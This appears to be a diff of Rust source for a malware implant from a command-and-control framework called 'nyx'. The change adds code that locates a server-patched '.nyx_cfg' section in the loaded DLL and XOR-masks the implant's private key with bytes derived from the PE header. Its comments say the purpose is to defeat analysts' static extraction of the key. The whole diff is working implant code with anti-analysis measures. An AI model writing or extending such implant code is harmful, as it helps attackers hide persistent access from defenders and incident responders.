@@ -28,65 +28,63 @@
 use crate::heap::{String, Vec};
 use nyx_protocol::wire::{Reader, WireError};
 
-/// Pointer to the `.nyx_cfg` section in the loaded PE image.
-///
-/// This is NOT a Rust static — it's a raw pointer computed from the module base
-/// and the section's RVA (resolved at runtime via the PE header). We cannot use
-/// `#[link_section]` here because the section is PATCHED by the server after
-/// compilation — writing to a `static` in a `#[link_section]` would require
-/// marking it `static mut`, which is unsound under Rust's aliasing rules when
-/// the section is written by an external process (the server patching the DLL).
-///
-/// Instead, we walk the module's PE header at runtime to find the `.nyx_cfg`
-/// section and return a `*const u8` into the loaded image. The server patches
-/// the section BEFORE the DLL is loaded (it patches the file on disk), so the
-/// bytes are already correct by the time we read them.
-fn nyx_cfg_ptr() -> Option<*const u8> {
-    // Walk PE header from module base.
-    // x86_64 Windows: get module base from the PEB → Ldr → InLoadOrderModuleList.
-    // First entry is the EXE; the DLL's own entry is found by matching its name
-    // or by using __ImageBase (provided by the linker).
-    //
-    // For a DLL, we can use the fact that the linker defines __ImageBase as the
-    // module base address (only for EXEs/DLLs — not shellcode). This is the
-    // simplest approach for a cdylib.
+/// Returns (module_base, .nyx_cfg_section_ptr), or None if the section is not found.
+fn nyx_cfg_ptr() -> Option<(*const u8, *const u8)> {
     extern "C" {
-        // Provided by the mingw-w64 linker. Points to the PE header.
         static __ImageBase: u8;
     }
     let base = unsafe { &__ImageBase as *const u8 };
 
-    // Parse PE header to find the .nyx_cfg section.
-    // PE layout: DOS header → PE signature → COFF header → optional header →
-    // section headers.
     let dos_header = base;
     let pe_offset = unsafe { *(dos_header.add(0x3C) as *const i32) } as isize;
     if pe_offset <= 0 {
-        return None; // not a valid PE
+        return None;
     }
     let pe_header = unsafe { base.offset(pe_offset) };
-    // PE signature is 4 bytes ("PE\0\0")
     let coff = unsafe { pe_header.add(4) };
-    // NumberOfSections is at offset 2 in COFF header (u16)
     let num_sections = unsafe { *(coff.add(2) as *const u16) } as usize;
-    // SizeOfOptionalHeader is at offset 16 in COFF header (u16)
     let opt_header_size = unsafe { *(coff.add(16) as *const u16) } as isize;
-
-    // First section header starts after COFF (20 bytes) + optional header
     let sections = unsafe { coff.add(20).offset(opt_header_size) };
     const SECTION_HEADER_SIZE: isize = 40;
 
     for i in 0..num_sections {
         let sh = unsafe { sections.offset(i as isize * SECTION_HEADER_SIZE) };
-        // Section name is at offset 0, 8 bytes max, not null-terminated
         let name = unsafe { core::slice::from_raw_parts(sh, 8) };
         if &name[..7] == b".nyx_cf" && name[7] == b'g' {
-            // VirtualAddress (RVA) at offset 12 (u32)
             let rva = unsafe { *(sh.add(12) as *const u32) } as isize;
-            return Some(unsafe { base.offset(rva) });
+            return Some((base, unsafe { base.offset(rva) }));
         }
     }
     None
+}
+
+/// Derive a 32-byte obfuscation mask from PE header bytes.
+///
+/// This mask is XOR'd with the implant's X25519 private key before writing it
+/// to `.nyx_cfg`, so the key is never in plaintext on disk. The server
+/// computes the same mask at generation time via `derive_mask_from_bytes()` in
+/// `crates/server/src/implant_gen.rs` — both sides MUST produce identical output.
+///
+/// Not cryptographic: an analyst who reverse-engineers the algorithm can
+/// recover the key. But it defeats trivial static extraction (grep for
+/// 0xDEADBEEF → read 32 bytes → key in hand). Recovery now requires
+/// understanding the XOR scheme and replicating the header mixing.
+fn compute_pe_mask(base: *const u8) -> [u8; 32] {
+    let header_len = core::cmp::min(4096usize, 0x1000);
+    let header = unsafe { core::slice::from_raw_parts(base, header_len) };
+    derive_mask_from_bytes(header)
+}
+
+/// Core mask derivation: XOR-stride accumulation over the input bytes.
+/// MUST match the server-side copy of this function exactly.
+fn derive_mask_from_bytes(data: &[u8]) -> [u8; 32] {
+    let mut mask = [0x5Au8; 32]; // non-zero seed
+    for (j, &b) in data.iter().enumerate() {
+        mask[j % 32] ^= b;
+        let idx = (j.wrapping_mul(17).wrapping_add(7)) % 32;
+        mask[idx] = mask[idx].wrapping_add(b).rotate_left((j % 7) as u32);
+    }
+    mask
 }
 
 /// Extra fields that may come from a per-implant (patched) config.
@@ -132,7 +130,7 @@ impl Default for ImplantConfig {
 /// keep them in maskable memory.
 pub fn load_runtime_config(
 ) -> Option<(crate::config::Config, ImplantConfig, Vec<u8>)> {
-    let ptr = nyx_cfg_ptr()?;
+    let (base, ptr) = nyx_cfg_ptr()?;
     let section = unsafe { core::slice::from_raw_parts(ptr, 1024) };
 
     // Read magic (4 bytes LE)
@@ -158,8 +156,15 @@ pub fn load_runtime_config(
         return None;
     }
 
-    // Read implant private key (32B at bytes 10-41).
-    let implant_priv: [u8; 32] = section[10..42].try_into().ok()?;
+    // Read obfuscated implant private key (32B at bytes 10-41).
+    // The key is XOR-obfuscated with a per-template mask — it is never stored
+    // in plaintext on disk. We must reverse the XOR before using it.
+    let obfuscated_priv: [u8; 32] = section[10..42].try_into().ok()?;
+    let pe_mask = compute_pe_mask(base);
+    let mut implant_priv = obfuscated_priv;
+    for i in 0..32 {
+        implant_priv[i] ^= pe_mask[i];
+    }
 
     // Read config nonce (12B at bytes 42-53).
     let config_nonce: [u8; 12] = section[42..54].try_into().ok()?;
